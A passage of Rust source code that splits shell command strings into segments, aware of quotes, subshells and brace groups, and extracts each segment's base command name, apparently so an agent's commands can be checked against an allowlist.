    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut paren_depth: u32 = 0;
    // #939: brace groups (`{ cmd; }`) need the same operator-shielding as
    // `( cmd )` subshells — otherwise a `}` that closes a `{` opened on an
    // earlier physical line (e.g. after heredoc-body stripping collapses the
    // body between them) is misread as its own bare command segment.
    let mut brace_depth: u32 = 0;

    while i < len {
        let ch = bytes[i];

        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }

        if in_double_quote {
            match ch {
                // \" stays inside the string; \\ consumes both so `"x\\"` closes.
                b'\\' => i = (i + 2).min(len),
                b'"' => {
                    in_double_quote = false;
                    i += 1;
                }
                _ => i += 1,
            }
            continue;
        }

        match ch {
            b'\\' => {
                // Escaped char is data (bash semantics outside quotes) — never
                // an operator or quote opener.
                i = (i + 2).min(len);
            }
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                paren_depth += 1;
                i += 1;
            }
            b')' => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b'{' => {
                brace_depth += 1;
                i += 1;
            }
            b'}' => {
                brace_depth = brace_depth.saturating_sub(1);
                i += 1;
            }
            b'\n' | b'\r' | b';' if paren_depth == 0 && brace_depth == 0 => {
                segments.push(&command[start..i]);
                i += 1;
                start = i;
            }
            b'&' if paren_depth == 0 && brace_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'&' {
                    // &&
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else if (i > 0 && bytes[i - 1] == b'>') || (i + 1 < len && bytes[i + 1] == b'>') {
                    // Redirect operator, NOT a separator: `2>&1`, `1>&2`, `>&file` (prev is '>')
                    // or `&>file`, `&>>file` (next is '>'). The '&' belongs to the current
                    // command — splitting here would mistake the fd/target (e.g. `1`) for a
                    // standalone command and falsely block it (#334).
                    i += 1;
                } else {
                    // single & (background operator) — still a command separator
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            b'|' if paren_depth == 0 && brace_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'|' {
                    // ||
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else if i > 0 && bytes[i - 1] == b'>' {
                    // `>|` (noclobber redirect), NOT a pipe: the '|' belongs to
                    // the redirect operator and the following token is a file
                    // path, not a command. Splitting here treated the target
                    // (e.g. `out` in `date >| out`) as a command and falsely
                    // blocked it against the allowlist (#387).
                    i += 1;
                } else {
                    // pipe
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    if start < len {
        segments.push(&command[start..]);
    }

    segments
}

/// Extract the base command name from a single segment (no operators).
fn extract_base_from_segment(segment: &str) -> String {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    let cmd_part = skip_env_assignments(trimmed);
    if cmd_part.is_empty() {
        return String::new();
    }

    let tokens = shell_tokenize(cmd_part);
    // #939: a leading `{` brace-group token (e.g. from
    // `agent_wrapper::rebuild`'s `{ <real command>\n} && pwd ...` wrapping)
    // is not itself a command — skip it so the base extracted is the real
    // command inside the group, not the brace.
    let mut token_iter = tokens.iter();
    let first_token = match token_iter.next().map(String::as_str) {
        Some("{") => token_iter.next().map_or("", String::as_str),
        other => other.unwrap_or(""),
    };

    first_token
        .rsplit('/')
        .next()
        .unwrap_or(first_token)
        .to_string()
}

/// Skip leading KEY=VALUE environment variable assignments.
/// Uses quote-aware scanning so `FOO="bar baz" git status` correctly
/// skips the entire `FOO="bar baz"` token.
fn skip_env_assignments(segment: &str) -> &str {
    let mut rest = segment;
    loop {
        let rest_trimmed = rest.trim_start();
        if rest_trimmed.is_empty() {
            return rest_trimmed;
        }
        let end = quote_aware_token_end(rest_trimmed);
        if end == 0 {
            return rest_trimmed;
        }
        let raw_token = &rest_trimmed[..end];
        let unquoted: String = raw_token
            .chars()
            .filter(|c| *c != '"' && *c != '\'')
            .collect();
        if unquoted.contains('=')
            && !unquoted.starts_with('-')
            && !unquoted.starts_with('/')
            && !unquoted.starts_with('.')
        {
            rest = &rest_trimmed[end..];
        } else {
            return rest_trimmed;
        }
    }
}

/// Public accessor for extracting all command segments.
pub fn extract_all_commands_pub(command: &str) -> Vec<String> {
    extract_all_commands(command)
}

// Legacy compat: single-segment extraction (used by other callers)
pub fn extract_base_command(command: &str) -> String {
    let first_seg = split_on_operators(command)
        .into_iter()
        .next()
        .unwrap_or(command);
    extract_base_from_segment(first_seg)
}
